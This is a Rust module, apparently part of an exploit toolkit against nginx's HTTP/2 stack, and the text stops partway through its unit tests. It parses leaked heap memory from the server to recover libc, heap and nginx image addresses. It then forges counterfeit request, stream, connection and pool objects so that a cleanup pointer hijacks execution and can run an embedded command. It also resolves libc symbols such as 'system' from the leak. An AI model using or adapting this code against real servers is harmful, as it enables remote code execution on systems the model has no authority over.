//! Interpret the in-band disclosure and build target-owned objects from it.
//!
//! Ported 1:1 from the reference `memory.py`: every locator fails unless it
//! finds exactly one candidate, so a wrong profile cannot silently forge.

use anyhow::{bail, Result};

use crate::h2::{MAX_WINDOW, DATA, END_STREAM};
use crate::profile::Profile;
use crate::tls::Transport;

#[allow(dead_code)]
pub const HEAP_POINTER_MIN: u64 = 0x0000_4000_0000_0000;
#[allow(dead_code)]
pub const HEAP_POINTER_MAX: u64 = 0x0000_7000_0000_0000;

fn u64_at(data: &[u8], offset: usize) -> u64 {
    u64::from_le_bytes(data[offset..offset + 8].try_into().expect("8 bytes"))
}

fn put_u64(data: &mut [u8], offset: usize, value: u64) {
    data[offset..offset + 8].copy_from_slice(&value.to_le_bytes());
}

fn in_heap(value: u64, profile: &Profile) -> bool {
    profile.libc.heap_pointer_min <= value && value < profile.libc.heap_pointer_max
}

fn in_arena(value: u64, profile: &Profile) -> bool {
    profile.libc.arena_pointer_min <= value && value < profile.libc.arena_pointer_max
}

/// Find copied nginx pools from their self-referential native fields.
pub fn find_pool(disclosure: &[u8], profile: &Profile) -> Vec<(usize, u64)> {
    let fields = &profile.heap.pool_field_offsets;
    let span = [
        fields.last,
        fields.end,
        fields.next,
        fields.current,
        fields.large,
    ]
    .into_iter()
    .max()
    .unwrap_or(0)
        + 8;
    let mut candidates = Vec::new();
    if disclosure.len() < span {
        return candidates;
    }
    for offset in 0..=disclosure.len() - span {
        let pool_end = u64_at(disclosure, offset + fields.end);
        let pool = pool_end.wrapping_sub(profile.heap.pool_user_bytes);
        if !in_heap(pool, profile) {
            continue;
        }
        let last = u64_at(disclosure, offset + fields.last);
        if pool + profile.heap.pool_minimum_data_offset <= last
            && last <= pool_end
            && u64_at(disclosure, offset + fields.next) == 0
            && u64_at(disclosure, offset + fields.current) == pool
            && u64_at(disclosure, offset + fields.large) == 0
        {
            candidates.push((offset, pool));
        }
    }
    candidates.sort_unstable();
    candidates.dedup();
    candidates
}

/// Derive the holder (H) and libc base from duplicated chunk/pool invariants.
pub fn locate_leak(disclosure: &[u8], profile: &Profile) -> Result<(usize, u64, u64)> {
    let heap = &profile.heap;
    let libc_profile = &profile.libc;
    let fields = &heap.chunk_field_offsets;
    let chunk_span = [
        fields.size,
        fields.forward,
        fields.backward,
        fields.chunk_address,
        fields.chunk_address_duplicate,
    ]
    .into_iter()
    .max()
    .unwrap_or(0)
        + 8;
    let mut candidates: Vec<(usize, u64, u64)> = Vec::new();

    if disclosure.len() >= chunk_span {
        for offset in 0..=disclosure.len() - chunk_span {
            if u64_at(disclosure, offset + fields.size) != heap.holder_chunk_size_word {
                continue;
            }
            let forward = u64_at(disclosure, offset + fields.forward);
            let backward = u64_at(disclosure, offset + fields.backward);
            let chunk = u64_at(disclosure, offset + fields.chunk_address);
            let duplicate = u64_at(disclosure, offset + fields.chunk_address_duplicate);
            if forward != backward
                || chunk != duplicate
                || chunk % libc_profile.heap_pointer_alignment != 0
                || !in_heap(chunk, profile)
            {
                continue;
            }
            for arena_offset in &libc_profile.arena_pointer_offsets {
                let libc = forward.wrapping_sub(*arena_offset);
                if libc % libc_profile.base_alignment == 0 && in_arena(forward, profile) {
                    candidates.push((offset, chunk + heap.holder_pointer_adjustment, libc));
                }
            }
        }
    }

    for (pool_offset, pool) in find_pool(disclosure, profile) {
        let size_offset = pool_offset as i64 - heap.holder_size_to_pool_bytes as i64;
        if size_offset < 0 {
            continue;
        }
        let size_offset = size_offset as usize;
        let marker_end = size_offset + heap.holder_marker_offset + heap.holder_marker_bytes;
        if marker_end > disclosure.len() || size_offset + chunk_span > disclosure.len() {
            continue;
        }
        if u64_at(disclosure, size_offset + fields.size) != heap.holder_chunk_size_word
            || disclosure[size_offset + heap.holder_marker_offset..marker_end]
                != vec![b'J'; heap.holder_marker_bytes]
        {
            continue;
        }
        let forward = u64_at(disclosure, size_offset + fields.forward);
        let backward = u64_at(disclosure, size_offset + fields.backward);
        for arena_pointer in [forward, backward] {
            for arena_offset in &libc_profile.arena_pointer_offsets {
                let libc = arena_pointer.wrapping_sub(*arena_offset);
                if libc % libc_profile.base_alignment == 0 && in_arena(arena_pointer, profile) {
                    candidates.push((
                        size_offset,
                        pool.wrapping_sub(heap.holder_user_to_pool_bytes),
                        libc,
                    ));
                }
            }
        }
    }
    candidates.sort_unstable();
    candidates.dedup();
    if candidates.len() != 1 {
        bail!("ambiguous leak: {} candidates", candidates.len());
    }
    Ok(candidates[0])
}

pub fn locate_libc_pointer_hint(
    disclosure: &[u8],
    size_offset: usize,
    profile: &Profile,
) -> Result<u64> {
    let fields = &profile.heap.chunk_field_offsets;
    let mut hints = [
        u64_at(disclosure, size_offset + fields.forward),
        u64_at(disclosure, size_offset + fields.backward),
    ]
    .into_iter()
    .filter(|pointer| in_arena(*pointer, profile))
    .collect::<Vec<_>>();
    hints.sort_unstable();
    hints.dedup();
    if hints.len() != 1 {
        bail!("ambiguous libc pointer hint: {} candidates", hints.len());
    }
    Ok(hints[0])
}

/// Locate a nginx object by relative pointers, without a PIE offset.
pub fn locate_nginx_image(disclosure: &[u8], profile: &Profile) -> Result<u64> {
    if disclosure.len() < 8 {
        bail!("disclosure is too short for an nginx anchor");
    }
    let pointers: Vec<u64> = (0..=disclosure.len() - 8).map(|o| u64_at(disclosure, o)).collect();
    let mut candidates = Vec::new();
    for pointer in &pointers {
        if !(0x4000_0000_0000..0x8000_0000_0000).contains(pointer) {
            continue;
        }
        if profile
            .fingerprint
            .nginx_image_pointer_deltas
            .iter()
            .all(|delta| {
                let target = if *delta >= 0 {
                    pointer.wrapping_add(*delta as u64)
                } else {
                    pointer.wrapping_sub(delta.unsigned_abs())
                };
                pointers.contains(&target)
            })
        {
            candidates.push(*pointer);
        }
    }
    candidates.sort_unstable();
    candidates.dedup();
    if candidates.len() != 1 {
        bail!("ambiguous Nginx image fingerprint: {} candidates", candidates.len());
    }
    Ok(candidates[0])
}

/// Recover a live blocked HTTP/2 request and its connection pointer.
pub fn locate_http2_request(
    disclosure: &[u8],
    nginx_anchor: u64,
    profile: &Profile,
) -> Result<(usize, u64, u64)> {
    let abi = profile.heap.address_disclosure.as_ref().expect("address ABI");
    let request_fields = &abi.request.fields;
    let stream_fields = &abi.stream.fields;
    let stream_span = [
        stream_fields.request,
        stream_fields.connection,
        stream_fields.node,
        stream_fields.send_window,
        stream_fields.connection_window,
        stream_fields.pool,
    ]
    .into_iter()
    .max()
    .unwrap_or(0)
        + 8;
    let mut candidates = Vec::new();
    if disclosure.len() < abi.request.bytes {
        bail!("disclosure is shorter than one nginx request");
    }
    for offset in 0..=disclosure.len() - abi.request.bytes {
        if &disclosure[offset..offset + 4] != b"HTTP" {
            continue;
        }
        let read_handler = u64_at(disclosure, offset + request_fields.read_handler);
        let write_handler = u64_at(disclosure, offset + request_fields.write_handler);
        let request = u64_at(disclosure, offset + request_fields.self_ptr);
        let stream = u64_at(disclosure, offset + request_fields.stream);
        if read_handler != nginx_anchor
            || !profile
                .fingerprint
                .nginx_image_pointer_deltas
                .contains(&(write_handler.wrapping_sub(read_handler) as i64))
            || !in_heap(request, profile)
            || !in_heap(stream, profile)
        {
            continue;
        }
        let mut stream_offsets = Vec::new();
        if disclosure.len() >= stream_span {
            for stream_offset in 0..=disclosure.len() - stream_span {
                if u64_at(disclosure, stream_offset + stream_fields.request) != request {
                    continue;
                }
                let h2c = u64_at(disclosure, stream_offset + stream_fields.connection);
                let node = u64_at(disclosure, stream_offset + stream_fields.node);
                if in_heap(h2c, profile) && in_heap(node, profile) {
                    stream_offsets.push((stream_offset, h2c));
                }
            }
        }
        if stream_offsets.len() == 1 {
            candidates.push((offset, write_handler, stream_offsets[0].1));
        }
    }
    if candidates.len() != 1 {
        bail!("ambiguous live HTTP/2 request: {} candidates", candidates.len());
    }
    Ok(candidates[0])
}

/// Locate the request's live output-chain context and runtime ctx index.
pub fn locate_copy_filter_context(
    disclosure: &[u8],
    request_offset: usize,
    profile: &Profile,
) -> Result<(usize, usize)> {
    let abi = profile.heap.address_disclosure.as_ref().expect("address ABI");
    let request_fields = &abi.request.fields;
    let context_fields = &abi.copy_context.fields;
    let request = u64_at(disclosure, request_offset + request_fields.self_ptr);
    let request_pool = u64_at(disclosure, request_offset + request_fields.pool);
    let context_array = u64_at(disclosure, request_offset + request_fields.context);
    let mut candidates = Vec::new();
    if disclosure.len() < abi.copy_context.bytes {
        bail!("disclosure is shorter than one copy context");
    }
    for offset in 0..=disclosure.len() - abi.copy_context.bytes {
        let source_chain = u64_at(disclosure, offset + context_fields.allocated);
        if u64_at(disclosure, offset + context_fields.pool) != request_pool
            || u64_at(disclosure, offset + context_fields.request) != request
            || !in_heap(source_chain, profile)
        {
            continue;
        }
        let context = source_chain.wrapping_sub(abi.copy_context.bytes as u64);
        let array_offset = offset as i64 - context.wrapping_sub(context_array) as i64;
        if array_offset < 0 || array_offset as usize > disclosure.len().saturating_sub(8) {
            continue;
        }
        let array_offset = array_offset as usize;
        let mut indexes = Vec::new();
        for index in 0..128usize {
            if array_offset + 8 * index + 8 <= disclosure.len()
                && u64_at(disclosure, array_offset + 8 * index) == context
            {
                indexes.push(index);
            }
        }
        if indexes.len() == 1 {
            candidates.push((offset, indexes[0]));
        }
    }
    if candidates.len() != 1 {
        bail!("ambiguous output-chain context: {} candidates", candidates.len());
    }
    Ok(candidates[0])
}

/// Build a target-owned HTTP/2 writer invocation over `segments`.
pub fn forge_address_disclosure(
    disclosure: &[u8],
    profile: &Profile,
    holder: u64,
    nginx_anchor: u64,
    segments: &[(u64, u64)],
    stream_id: u32,
    command: &[u8],
) -> Result<(Vec<u8>, Vec<u8>)> {
    let (request_offset, writer, h2c) =
        locate_http2_request(disclosure, nginx_anchor, profile)?;
    let (copy_context_offset, copy_context_index) =
        locate_copy_filter_context(disclosure, request_offset, profile)?;
    let heap = &profile.heap;
    let abi = heap.address_disclosure.as_ref().expect("address ABI");
    let offsets = &abi.holder_offsets;
    let request_fields = &abi.request.fields;
    let context_fields = &abi.copy_context.fields;
    let connection_fields = &abi.connection.fields;
    let event_fields = &abi.event.fields;
    let stream_fields = &abi.stream.fields;
    let chain_abi = &abi.chain;
    let buffer_fields = &chain_abi.fields;
    let pool_fields = &heap.pool_field_offsets;
    let pool_extra = &abi.pool_extra_fields;
    let mut value = vec![0u8; heap.holder_value_bytes];

    let request_at = offsets.request;
    let connection_at = request_at + abi.request.bytes;
    let event_at = connection_at + abi.connection.bytes;
    let log_at = event_at + abi.event.bytes;
    let stream_at = offsets.stream;
    let node_at = offsets.node;
    let chain_at = offsets.chain;
    let context_at = offsets.context;
    let copy_context_at = offsets.copy_context;
    let pool_at = offsets.pool;
    let pool_data_at = offsets.pool_data;
    let pool_end_at = value.len() & !0xf;

    let absolute = |offset: usize| holder + offset as u64;

    value[request_at..request_at + abi.request.bytes]
        .copy_from_slice(&disclosure[request_offset..request_offset + abi.request.bytes]);
    // H starts with the cleanup record that calls the cloned request's writer.
    put_u64(&mut value, 0, writer);
    put_u64(&mut value, 8, absolute(request_at));
    put_u64(&mut value, 16, 0);

    put_u64(&mut value, request_at + request_fields.context, absolute(context_at));
    for (field, target) in [
        (request_fields.connection, connection_at),
        (request_fields.pool, pool_at),
        (request_fields.self_ptr, request_at),
        (request_fields.stream, stream_at),
    ] {
        put_u64(&mut value, request_at + field, absolute(target));
    }
    for offset in &abi.request.zero_qwords {
        put_u64(&mut value, request_at + offset, 0);
    }
    put_u64(&mut value, request_at + request_fields.count, 2);
    let flags_at = request_at + request_fields.flags;
    value[flags_at..flags_at + abi.request.flag_bytes].fill(0);
    value[flags_at..flags_at + 4].copy_from_slice(&1u32.to_le_bytes());
    value[request_at + request_fields.buffered] |= 0x40; // H2 output pending

    value[copy_context_at..copy_context_at + abi.copy_context.bytes].copy_from_slice(
        &disclosure[copy_context_offset..copy_context_offset + abi.copy_context.bytes],
    );
    put_u64(&mut value, context_at + 8 * copy_context_index, absolute(copy_context_at));
    for (field, target) in [
        (context_fields.free, Some(0)),
        (context_fields.busy, Some(chain_at)),
        (context_fields.out, Some(0)),
        (context_fields.allocated, Some(0)),
        (context_fields.tag, Some(0)),
        (context_fields.last_out, Some(0)),
        (context_fields.last, Some(0)),
        (context_fields.pool, Some(pool_at)),
        (context_fields.filter_ctx, Some(0)),
        (context_fields.request, Some(request_at)),
    ] {
        put_u64(
            &mut value,
            copy_context_at + field,
            match target {
                Some(target) if target == 0 => 0,
                Some(target) => absolute(target),
                None => 0,
            },
        );
    }

    put_u64(&mut value, connection_at + connection_fields.data, absolute(request_at));
    put_u64(&mut value, connection_at + connection_fields.write, absolute(event_at));
    put_u64(
        &mut value,
        connection_at + connection_fields.send_chain,
        nginx_anchor.wrapping_add(profile.fingerprint.http2_send_chain_delta.unwrap_or(0) as u64),
    );
    put_u64(&mut value, connection_at + connection_fields.log, absolute(log_at));

    let deferred = heap.deferred_execution.is_some();
    let event_data = if deferred {
        absolute(heap.holder_user_to_pool_bytes as usize)
    } else {
        absolute(connection_at)
    };
    put_u64(&mut value, event_at + event_fields.data, event_data);
    put_u64(&mut value, event_at + event_fields.flags, 0x29);
    if deferred {
        put_u64(
            &mut value,
            event_at + event_fields.handler,
            nginx_anchor
                .wrapping_add(profile.fingerprint.resolver_timeout_delta.unwrap_or(0) as u64),
        );
    }
    put_u64(&mut value, event_at + event_fields.log, absolute(log_at));

    put_u64(&mut value, stream_at + stream_fields.request, absolute(request_at));
    put_u64(&mut value, stream_at + stream_fields.connection, h2c);
    put_u64(&mut value, stream_at + stream_fields.node, absolute(node_at));
    put_u64(&mut value, stream_at + stream_fields.send_window, MAX_WINDOW as u64);
    put_u64(&mut value, stream_at + stream_fields.connection_window, 65535);
    put_u64(&mut value, stream_at + stream_fields.pool, absolute(pool_at));
    put_u64(&mut value, node_at, stream_id as u64);

    if segments.is_empty() || segments.len() > 2 {
        bail!("address disclosure requires one or two segments");
    }
    for (index, (address, size)) in segments.iter().enumerate() {
        let item_at = chain_at + index * chain_abi.item_bytes;
        let buffer_at = item_at + chain_abi.buffer_offset;
        let next_at = chain_at + (index + 1) * chain_abi.item_bytes;
        put_u64(&mut value, item_at, absolute(buffer_at));
        put_u64(
            &mut value,
            item_at + 8,
            if index + 1 < segments.len() { absolute(next_at) } else { 0 },
        );
        for field in [buffer_fields.pos, buffer_fields.start] {
            put_u64(&mut value, buffer_at + field, *address);
        }
        for field in [buffer_fields.last, buffer_fields.end] {
            put_u64(&mut value, buffer_at + field, address.wrapping_add(*size));
        }
        put_u64(&mut value, buffer_at + buffer_fields.flags, 0x22);
    }

    put_u64(&mut value, pool_at + pool_fields.last, absolute(pool_data_at));
    put_u64(&mut value, pool_at + pool_fields.end, absolute(pool_end_at));
    put_u64(
        &mut value,
        pool_at + pool_extra.max,
        (pool_end_at - pool_at - 0x50) as u64,
    );
    put_u64(&mut value, pool_at + pool_fields.current, absolute(pool_at));
    put_u64(&mut value, pool_at + pool_extra.log, absolute(log_at));

    if deferred {
        let command_at = heap.callback_command_offset;
        value[command_at..command_at + command.len()].copy_from_slice(command);
        value[command_at + command.len()] = 0;
    }

    let mut pool_stub = vec![0u8; heap.pool_stub_bytes];
    put_u64(&mut pool_stub, pool_fields.cleanup, holder);
    let mut adaptive = vec![b'L'; heap.overlap_prefix_bytes];
    if let Some(size_word) = heap.victim_chunk_size_word {
        let start = adaptive.len() - 0x10;
        put_u64(&mut adaptive, start, 0);
        put_u64(&mut adaptive, start + 8, size_word);
    }
    adaptive.extend_from_slice(&pool_stub);
    Ok((value, adaptive))
}

pub fn memory_read(segments: &[(u64, Vec<u8>)], address: u64, size: usize) -> Result<Vec<u8>> {
    for (base, data) in segments {
        if address >= *base && address - *base + size as u64 <= data.len() as u64 {
            let offset = (address - *base) as usize;
            return Ok(data[offset..offset + size].to_vec());
        }
    }
    bail!("address disclosure omitted {address:#x}+{size:#x}")
}

/// Resolve a dynamic symbol only from memory returned on the wire.
pub fn resolve_elf64_symbol(segments: &[(u64, Vec<u8>)], name: &str) -> Result<(u64, u64)> {
    let mut elf_headers = Vec::new();
    for (base, data) in segments {
        let mut offset = 0;
        while offset + 4 <= data.len() {
            if &data[offset..offset + 4] == b"\x7fELF" {
                elf_headers.push(*base + offset as u64);
            }
            offset += 4096;
        }
    }
    if elf_headers.len() != 1 {
        bail!("address read contains {} ELF headers", elf_headers.len());
    }
    let base = elf_headers[0];
    let header = memory_read(segments, base, 64)?;
    if &header[4..7] != b"\x02\x01\x01"
        || u16::from_le_bytes([header[16], header[17]]) != 3
        || u16::from_le_bytes([header[18], header[19]]) != 62
        || u32::from_le_bytes([header[20], header[21], header[22], header[23]]) != 1
    {
        bail!("address read is not an x86-64 little-endian ET_DYN ELF");
    }
    let phoff = u64_at(&header, 32);
    let phentsize = u16::from_le_bytes([header[54], header[55]]) as usize;
    let phnum = u16::from_le_bytes([header[56], header[57]]) as usize;
    if phentsize != 56 || !(1..=128).contains(&phnum) {
        bail!("invalid ELF program-header geometry");
    }
    let mut dynamic: Option<(u64, u64)> = None;
    let mut executable_loads = Vec::new();
    for index in 0..phnum {
        let ph = memory_read(segments, base + phoff + (index * phentsize) as u64, 56)?;
        let kind = u32::from_le_bytes([ph[0], ph[1], ph[2], ph[3]]);
        let flags = u32::from_le_bytes([ph[4], ph[5], ph[6], ph[7]]);
        let virtual_address = u64_at(&ph, 16);
        let memory_size = u64_at(&ph, 40);
        if virtual_address.wrapping_add(memory_size) > 1 << 48 {
            bail!("ELF load geometry is unsupported");
        }
        if kind == 1 && flags & 1 != 0 && memory_size != 0 {
            executable_loads.push((virtual_address, virtual_address + memory_size));
        } else if kind == 2 {
            if dynamic.is_some() {
                bail!("ELF has multiple PT_DYNAMIC entries");
            }
            dynamic = Some((base + virtual_address, memory_size));
        }
    }
    let dynamic = dynamic.ok_or_else(|| anyhow::anyhow!("ELF has no bounded PT_DYNAMIC"))?;
    if dynamic.1 > 0x10000 || executable_loads.is_empty() {
        bail!("ELF has no bounded PT_DYNAMIC");
    }

    let mut tags = std::collections::HashMap::new();
    let mut offset = 0u64;
    while offset < dynamic.1 {
        let entry = memory_read(segments, dynamic.0 + offset, 16)?;
        let tag = u64_at(&entry, 0);
        let value = u64_at(&entry, 8);
        if tag == 0 {
            break;
        }
        tags.entry(tag).or_insert(value);
        offset += 16;
    }
    for tag in [4u64, 5, 6, 10, 11] {
        if !tags.contains_key(&tag) {
            bail!("ELF dynamic tag {tag:#x} is absent");
        }
    }
    if tags[&11] != 24 || tags[&10] > 0x100000 {
        bail!("ELF dynamic table geometry is unsupported");
    }
    let runtime_pointer = |value: u64| -> u64 {
        if segments
            .iter()
            .any(|(base, data)| value >= *base && value < *base + data.len() as u64)
        {
            value
        } else {
            base + value
        }
    };
    let table_hash = runtime_pointer(tags[&4]);
    let table_string = runtime_pointer(tags[&5]);
    let table_symbol = runtime_pointer(tags[&6]);
    let hash = memory_read(segments, table_hash, 8)?;
    let symbol_count = u32::from_le_bytes([hash[4], hash[5], hash[6], hash[7]]) as usize;
    if symbol_count > 0x10000 {
        bail!("ELF symbol count is unreasonable");
    }
    let names = memory_read(segments, table_string, tags[&10] as usize)?;
    let wanted = format!("{name}\0").into_bytes();
    let mut matches = Vec::new();
    for index in 0..symbol_count {
        let symbol = memory_read(segments, table_symbol + (index * 24) as u64, 24)?;
        let name_offset = u32::from_le_bytes([symbol[0], symbol[1], symbol[2], symbol[3]]) as usize;
        if name_offset >= names.len() || !names[name_offset..].starts_with(&wanted) {
            continue;
        }
        let value = u64_at(&symbol, 8);
        let section = u16::from_le_bytes([symbol[6], symbol[7]]);
        let binding = symbol[4] >> 4;
        let kind = symbol[4] & 0xf;
        let visibility = symbol[5] & 3;
        if value != 0
            && section != 0
            && matches!(binding, 1 | 2)
            && matches!(kind, 2 | 10)
            && matches!(visibility, 0 | 3)
            && executable_loads
                .iter()
                .any(|(start, end)| *start <= value && value < *end)
        {
            matches.push(base + value);
        }
    }
    if matches.len() != 1 {
        bail!("ELF symbol {name:?} has {} definitions", matches.len());
    }
    Ok((matches[0], base))
}

/// Require exactly one profile's heap/libc/nginx invariants to match.
pub fn select_disclosure_profile(
    disclosure: &[u8],
    profiles: &[Profile],
) -> Result<(Profile, usize, u64, u64, u64)> {
    let mut candidates = Vec::new();
    let mut failures = Vec::new();
    for profile in profiles {
        let (size_offset, holder, libc) = match locate_leak(disclosure, profile) {
            Ok(values) => values,
            Err(error) => {
                failures.push(format!("{}: leak {error}", profile.name));
                continue;
            }
        };
        let nginx = match locate_nginx_image(disclosure, profile) {
            Ok(value) => value,
            Err(error) => {
                failures.push(format!("{}: nginx {error}", profile.name));
                continue;
            }
        };
        candidates.push((profile.clone(), size_offset, holder, libc, nginx));
    }
    if candidates.len() != 1 {
        let detail = if failures.is_empty() {
            String::new()
        } else {
            format!("; {}", failures.join("; "))
        };
        bail!("disclosure matches {} target profiles{detail}", candidates.len());
    }
    Ok(candidates.remove(0))
}

/// Find the unique expected DATA chain inside corrupted leading output.
pub fn extract_disclosure(raw: &[u8], stream_id: u32, frame_bytes: &[usize]) -> Result<Vec<u8>> {
    let mut disclosures = Vec::new();
    if raw.len() >= 9 {
        for offset in 0..=raw.len() - 9 {
            let mut cursor = offset;
            let mut chunks = Vec::new();
            for (index, expected) in frame_bytes.iter().enumerate() {
                if cursor + 9 + expected > raw.len() {
                    break;
                }
                let length =
                    ((raw[cursor] as usize) << 16) | ((raw[cursor + 1] as usize) << 8) | raw[cursor + 2] as usize;
                let flags = raw[cursor + 4];
                let stream = u32::from_be_bytes([
                    raw[cursor + 5],
                    raw[cursor + 6],
                    raw[cursor + 7],
                    raw[cursor + 8],
                ]) & MAX_WINDOW;
                if length != *expected
                    || raw[cursor + 3] != DATA
                    || (flags & END_STREAM != 0) != (index + 1 == frame_bytes.len())
                    || stream != stream_id
                {
                    break;
                }
                chunks.extend_from_slice(&raw[cursor + 9..cursor + 9 + length]);
                cursor += 9 + length;
            }
            if chunks.len() == frame_bytes.iter().sum::<usize>() && !chunks.is_empty() {
                disclosures.push(chunks);
            }
        }
    }
    disclosures.dedup();
    if disclosures.len() != 1 {
        bail!("expected one complete disclosure, got {}", disclosures.len());
    }
    Ok(disclosures.remove(0))
}

/// Collect a target stream's complete body across ordinary DATA frames.
pub fn extract_data_body(raw: &[u8], stream_id: u32, body_bytes: usize) -> Result<Vec<u8>> {
    let mut candidates = Vec::new();
    for start in 0..raw.len().saturating_sub(8) {
        let mut cursor = start;
        let mut body = Vec::new();
        let mut started = false;
        while cursor + 9 <= raw.len() {
            let length =
                ((raw[cursor] as usize) << 16) | ((raw[cursor + 1] as usize) << 8) | raw[cursor + 2] as usize;
            let end = cursor + 9 + length;
            if end > raw.len() {
                break;
            }
            let kind = raw[cursor + 3];
            let flags = raw[cursor + 4];
            let actual_stream = u32::from_be_bytes([
                raw[cursor + 5],
                raw[cursor + 6],
                raw[cursor + 7],
                raw[cursor + 8],
            ]) & MAX_WINDOW;
            if kind == DATA && actual_stream == stream_id {
                let mut payload = &raw[cursor + 9..end];
                if flags & 0x08 != 0 {
                    if payload.is_empty() || payload[0] as usize >= payload.len() {
                        break;
                    }
                    let padding = payload[0] as usize;
                    payload = &payload[1..payload.len() - padding];
                }
                body.extend_from_slice(payload);
                started = true;
                if body.len() == body_bytes {
                    candidates.push(body.clone());
                    break;
                }
                if body.len() > body_bytes {
                    break;
                }
            } else if started {
                break;
            }
            cursor = end;
        }
    }
    candidates.sort_unstable();
    candidates.dedup();
    if candidates.len() != 1 {
        bail!("address disclosure has {} complete frame chains", candidates.len());
    }
    Ok(candidates.remove(0))
}

/// Read a bounded wire capture while retaining connection-end evidence.
pub fn capture_raw<T: Transport>(
    session: &mut crate::h2::Session<T>,
    byte_limit: usize,
    idle_timeout: std::time::Duration,
    total_timeout: Option<std::time::Duration>,
) -> Result<Vec<u8>> {
    let deadline = total_timeout.map(|timeout| std::time::Instant::now() + timeout);
    let mut raw = Vec::new();
    while raw.len() < byte_limit {
        if let Some(deadline) = deadline {
            if std::time::Instant::now() >= deadline {
                break;
            }
        }
        session.transport.set_read_timeout(idle_timeout);
        match session.transport.recv(byte_limit - raw.len()) {
            Ok(chunk) => {
                if chunk.is_empty() {
                    session.end = Some("eof".to_string());
                    break;
                }
                raw.extend_from_slice(&chunk);
            }
            Err(error)
                if matches!(
                    error.kind(),
                    std::io::ErrorKind::TimedOut | std::io::ErrorKind::WouldBlock
                ) =>
            {
                if deadline.is_none() {
                    break;
                }
            }
            Err(error) => {
                session.end = Some(error.to_string());
                break;
            }
        }
    }
    Ok(raw)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::load_builtins;

    fn profile_1318() -> Profile {
        load_builtins().unwrap().into_iter().find(|p| p.name.contains("1.31.8")).unwrap()
    }

    /// Port of tests/fixtures.py::address_disclosure_fixture.
    fn disclosure_fixture() -> (Vec<u8>, Profile, u64, u64, u64, Vec<(u64, u64)>, usize, usize) {
        let profile = profile_1318();
        let total: usize = profile.transport.disclosure_frame_bytes.iter().sum();
        let mut disclosure = vec![0u8; total];
        let request_offset = 100usize;
        let nginx = 0x0000_6000_0010_0000u64;
        let request = 0x0000_5000_0002_0000u64;
        let stream = 0x0000_5000_0003_0000u64;
        let request_pool = 0x0000_5000_0004_0000u64;
        let context_array = 0x0000_5000_0005_0000u64;
        let h2c = 0x0000_5000_0006_0000u64;
        let node = 0x0000_5000_0007_0000u64;

        disclosure[request_offset..request_offset + 4].copy_from_slice(b"HTTP");
        for (offset, value) in [
            (0x30, nginx),
            (0x38, nginx),
            (0x400, request),
            (0x490, stream),
            (0x58, request_pool),
            (0x10, context_array),
        ] {
            put_u64(&mut disclosure, request_offset + offset, value);
        }
        put_u64(&mut disclosure, 3000, request);
        put_u64(&mut disclosure, 3008, h2c);
        put_u64(&mut disclosure, 3016, node);

        let copy_context_offset = 4000usize;
        let context_index = 100usize;
        let context = context_array + 8 * context_index as u64;
        for (offset, value) in [
            (0x18, context + 0x80),
            (0x48, request_pool),
            (0x78, request),
            (0, context),
        ] {
            put_u64(&mut disclosure, copy_context_offset + offset, value);
        }

        let holder = 0x0000_5000_0001_0000u64;
        let libc = 0x0000_7800_0000_0000u64;
        let size_offset = 6000usize;
        let pool_offset = size_offset + profile.heap.holder_size_to_pool_bytes as usize;
        let pool = holder + profile.heap.holder_user_to_pool_bytes;
        let chunk_fields = &profile.heap.chunk_field_offsets;
        let arena = libc + profile.libc.arena_pointer_offsets[0];
        put_u64(&mut disclosure, size_offset + chunk_fields.size, profile.heap.holder_chunk_size_word);
        put_u64(&mut disclosure, size_offset + chunk_fields.forward, arena);
        put_u64(&mut disclosure, size_offset + chunk_fields.backward, arena);
        let marker_start = size_offset + profile.heap.holder_marker_offset;
        disclosure[marker_start..marker_start + profile.heap.holder_marker_bytes]
            .fill(b'J');
        let pool_fields = &profile.heap.pool_field_offsets;
        put_u64(&mut disclosure, pool_offset + pool_fields.last, pool + profile.heap.pool_minimum_data_offset);
        put_u64(&mut disclosure, pool_offset + pool_fields.end, pool + profile.heap.pool_user_bytes);
        put_u64(&mut disclosure, pool_offset + pool_fields.current, pool);
        for (index, delta) in profile.fingerprint.nginx_image_pointer_deltas.iter().enumerate() {
            let value = if *delta >= 0 { nginx + *delta as u64 } else { nginx - delta.unsigned_abs() };
            put_u64(&mut disclosure, 8500 + 8 * index, value);
        }
        let segments = vec![(0x0000_7800_0000_0000u64, 0x28000u64), (0x0000_7800_001d_d000u64, 0x9000u64)];
        (disclosure, profile, holder, nginx, libc, segments, request_offset, size_offset)
    }

    /// Port of tests/fixtures.py::minimal_runtime_elf.
    fn minimal_elf() -> (u64, Vec<u8>) {
        let base = 0x0000_7800_0000_0000u64;
        let mut image = vec![0u8; 0x4000];
        image[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
        image[16..20].copy_from_slice(&[3, 0, 62, 0]);
        image[20..24].copy_from_slice(&1u32.to_le_bytes());
        put_u64(&mut image, 32, 64);
        image[54] = 56;
        image[56] = 2;
        image[64..68].copy_from_slice(&1u32.to_le_bytes());
        image[68..72].copy_from_slice(&1u32.to_le_bytes());
        let image_len = image.len() as u64;
        put_u64(&mut image, 64 + 32, image_len);
        put_u64(&mut image, 64 + 40, image_len);
        let dynamic = 64 + 56;
        image[dynamic..dynamic + 4].copy_from_slice(&2u32.to_le_bytes());
        put_u64(&mut image, dynamic + 16, 0x200);
        put_u64(&mut image, dynamic + 40, 0x80);
        for (index, (tag, value)) in [
            (4u64, base + 0x300),
            (5, base + 0x400),
            (6, base + 0x500),
            (10, 8),
            (11, 24),
            (0, 0),
        ]
        .into_iter()
        .enumerate()
        {
            put_u64(&mut image, 0x200 + 16 * index, tag);
            put_u64(&mut image, 0x200 + 16 * index + 8, value);
        }
        image[0x300..0x308].copy_from_slice(&[1, 0, 0, 0, 2, 0, 0, 0]);
        image[0x400..0x408].copy_from_slice(b"\0system\0");
        let symbol = 0x500 + 24;
        image[symbol..symbol + 4].copy_from_slice(&1u32.to_le_bytes());
        image[symbol + 4] = 0x12;
        image[symbol + 5] = 0;
        image[symbol + 6..symbol + 8].copy_from_slice(&1u16.to_le_bytes());
        put_u64(&mut image, symbol + 8, 0x900);
        (base, image)
    }

    #[test]
    fn fixture_locates_holder_nginx_and_libc() {
        let (disclosure, profile, holder, nginx, libc, _segments, _r, _s) = disclosure_fixture();
        assert_eq!(locate_leak(&disclosure, &profile).unwrap(), (6000, holder, libc));
        assert_eq!(locate_nginx_image(&disclosure, &profile).unwrap(), nginx);
        let (request_offset, writer, _h2c) =
            locate_http2_request(&disclosure, nginx, &profile).unwrap();
        assert_eq!(request_offset, 100);
        assert_eq!(writer, nginx);
        let (context_offset, index) =
